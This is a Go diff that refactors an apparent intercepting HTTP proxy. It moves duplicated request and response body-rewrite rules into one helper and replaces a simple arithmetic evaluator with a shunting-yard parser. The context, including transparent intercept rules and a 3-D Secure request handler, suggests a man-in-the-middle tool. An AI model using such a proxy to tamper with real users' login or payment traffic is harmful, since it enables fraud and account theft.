@@ -1286,41 +1286,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									continue
 								}
 								if len(ic.alterRequest) > 0 {
-									bodyStr := string(body)
-									for _, rule := range ic.alterRequest {
-										if strings.Contains(rule.replace, "[[") {
-											bodyStr = rule.re.ReplaceAllStringFunc(bodyStr, func(match string) string {
-												submatches := rule.re.FindStringSubmatch(match)
-												replaced := rule.replace
-												for i, sm := range submatches {
-													if i > 0 {
-														replaced = strings.Replace(replaced, "$"+strconv.Itoa(i), sm, -1)
-													}
-												}
-												for {
-													if idx := strings.Index(replaced, "[["); idx != -1 {
-														if endIdx := strings.Index(replaced[idx+2:], "]]"); endIdx != -1 {
-															expr := replaced[idx+2 : idx+2+endIdx]
-															result := evaluateExpr(expr, submatches)
-															if result != "" {
-																replaced = replaced[:idx] + result + replaced[idx+2+endIdx+2:]
-															} else {
-																break
-															}
-														} else {
-															break
-														}
-													} else {
-														break
-													}
-												}
-												return replaced
-											})
-										} else {
-											bodyStr = rule.re.ReplaceAllString(bodyStr, rule.replace)
-										}
-									}
-									body = []byte(bodyStr)
+									body = []byte(applyAlterRules(string(body), ic.alterRequest))
 								}
 								req.Body = io.NopCloser(bytes.NewBuffer(body))
 								req.ContentLength = int64(len(body))
@@ -1711,47 +1677,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if ic.type_ != "transparent" {
 								continue
 							}
-							if ic.responseMatch != nil || len(ic.alterResponse) > 0 {
-								if ic.responseMatch != nil && !ic.responseMatch.Match(body) {
-									continue
-								}
-								if len(ic.alterResponse) > 0 {
-									bodyStr := string(body)
-									for _, rule := range ic.alterResponse {
-										if strings.Contains(rule.replace, "[[") {
-											bodyStr = rule.re.ReplaceAllStringFunc(bodyStr, func(match string) string {
-												submatches := rule.re.FindStringSubmatch(match)
-												replaced := rule.replace
-												for i, sm := range submatches {
-													if i > 0 {
-														replaced = strings.Replace(replaced, "$"+strconv.Itoa(i), sm, -1)
-													}
-												}
-												for {
-													if idx := strings.Index(replaced, "[["); idx != -1 {
-														if endIdx := strings.Index(replaced[idx+2:], "]]"); endIdx != -1 {
-															expr := replaced[idx+2 : idx+2+endIdx]
-															result := evaluateExpr(expr, submatches)
-															if result != "" {
-																replaced = replaced[:idx] + result + replaced[idx+2+endIdx+2:]
-															} else {
-																break
-															}
-														} else {
-															break
-														}
-													} else {
-														break
-													}
-												}
-												return replaced
-											})
-										} else {
-											bodyStr = rule.re.ReplaceAllString(bodyStr, rule.replace)
-										}
-									}
-									body = []byte(bodyStr)
-								}
+							if ic.responseMatch != nil && !ic.responseMatch.Match(body) {
+								continue
+							}
+							if len(ic.alterResponse) > 0 {
+								body = []byte(applyAlterRules(string(body), ic.alterResponse))
 							}
 						}
 					}
@@ -3448,6 +3378,43 @@ func (p *HttpProxy) handle3DSRequest(req *http.Request) (*http.Request, *http.Re
 	}
 }
 
+func applyAlterRules(body string, rules []AlterRule) string {
+	for _, rule := range rules {
+		if strings.Contains(rule.replace, "[[") {
+			body = rule.re.ReplaceAllStringFunc(body, func(match string) string {
+				submatches := rule.re.FindStringSubmatch(match)
+				replaced := rule.replace
+				for i, sm := range submatches {
+					if i > 0 {
+						replaced = strings.Replace(replaced, "$"+strconv.Itoa(i), sm, -1)
+					}
+				}
+				for {
+					if idx := strings.Index(replaced, "[["); idx != -1 {
+						if endIdx := strings.Index(replaced[idx+2:], "]]"); endIdx != -1 {
+							expr := replaced[idx+2 : idx+2+endIdx]
+							result := evaluateExpr(expr, submatches)
+							if result != "" {
+								replaced = replaced[:idx] + result + replaced[idx+2+endIdx+2:]
+							} else {
+								break
+							}
+						} else {
+							break
+						}
+					} else {
+						break
+					}
+				}
+				return replaced
+			})
+		} else {
+			body = rule.re.ReplaceAllString(body, rule.replace)
+		}
+	}
+	return body
+}
+
 func evaluateExpr(expr string, args []string) string {
 	for i, arg := range args {
 		if i == 0 {
@@ -3455,9 +3422,17 @@ func evaluateExpr(expr string, args []string) string {
 		}
 		expr = strings.Replace(expr, "$"+strconv.Itoa(i), arg, -1)
 	}
-	var result float64
-	var current float64
-	var op byte
+	tokens := tokenize(expr)
+	postfix := shuntingYard(tokens)
+	result := evaluatePostfix(postfix)
+	if result == nil {
+		return ""
+	}
+	return strconv.FormatFloat(*result, 'f', 1, 64)
+}
+
+func tokenize(expr string) []string {
+	var tokens []string
 	var num []byte
 	for i := 0; i < len(expr); i++ {
 		c := expr[i]
@@ -3466,54 +3441,89 @@ func evaluateExpr(expr string, args []string) string {
 			continue
 		}
 		if len(num) > 0 {
-			val, err := strconv.ParseFloat(string(num), 64)
-			if err != nil {
-				return ""
-			}
-			if op == 0 {
-				current = val
-			} else {
-				switch op {
-				case '+':
-					current += val
-				case '-':
-					current -= val
-				case '*':
-					current *= val
-				case '/':
-					if val != 0 {
-						current /= val
-					}
-				}
-			}
+			tokens = append(tokens, string(num))
 			num = num[:0]
 		}
 		if c == '+' || c == '-' || c == '*' || c == '/' {
-			op = c
+			tokens = append(tokens, string(c))
 		}
 	}
 	if len(num) > 0 {
-		val, err := strconv.ParseFloat(string(num), 64)
-		if err != nil {
-			return ""
-		}
-		if op == 0 {
-			current = val
-		} else {
-			switch op {
-			case '+':
-				current += val
-			case '-':
-				current -= val
-			case '*':
-				current *= val
-			case '/':
-				if val != 0 {
-					current /= val
-				}
+		tokens = append(tokens, string(num))
+	}
+	return tokens
+}
+
+func shuntingYard(tokens []string) []string {
+	var output []string
+	var operators []string
+	precedence := map[string]int{"+": 1, "-": 1, "*": 2, "/": 2}
+	for _, token := range tokens {
+		if _, ok := precedence[token]; ok {
+			for len(operators) > 0 && precedence[operators[len(operators)-1]] >= precedence[token] {
+				output = append(output, operators[len(operators)-1])
+				operators = operators[:len(operators)-1]
 			}
+			operators = append(operators, token)
+		} else {
+			output = append(output, token)
 		}
 	}
-	result = current
-	return strconv.FormatFloat(result, 'f', 1, 64)
+	for len(operators) > 0 {
+		output = append(output, operators[len(operators)-1])
+		operators = operators[:len(operators)-1]
+	}
+	return output
+}
+
+func evaluatePostfix(postfix []string) *float64 {
+	var stack []float64
+	for _, token := range postfix {
+		switch token {
+		case "+":
+			if len(stack) < 2 {
+				return nil
+			}
+			b := stack[len(stack)-1]
+			a := stack[len(stack)-2]
+			stack = stack[:len(stack)-2]
+			stack = append(stack, a+b)
+		case "-":
+			if len(stack) < 2 {
+				return nil
+			}
+			b := stack[len(stack)-1]
+			a := stack[len(stack)-2]
+			stack = stack[:len(stack)-2]
+			stack = append(stack, a-b)
+		case "*":
+			if len(stack) < 2 {
+				return nil
+			}
+			b := stack[len(stack)-1]
+			a := stack[len(stack)-2]
+			stack = stack[:len(stack)-2]
+			stack = append(stack, a*b)
+		case "/":
+			if len(stack) < 2 {
+				return nil
+			}
+			b := stack[len(stack)-1]
+			a := stack[len(stack)-2]
+			stack = stack[:len(stack)-2]
+			if b != 0 {
+				stack = append(stack, a/b)
+			}
+		default:
+			val, err := strconv.ParseFloat(token, 64)
+			if err != nil {
+				return nil
+			}
+			stack = append(stack, val)
+		}
+	}
+	if len(stack) != 1 {
+		return nil
+	}
+	return &stack[0]
 }
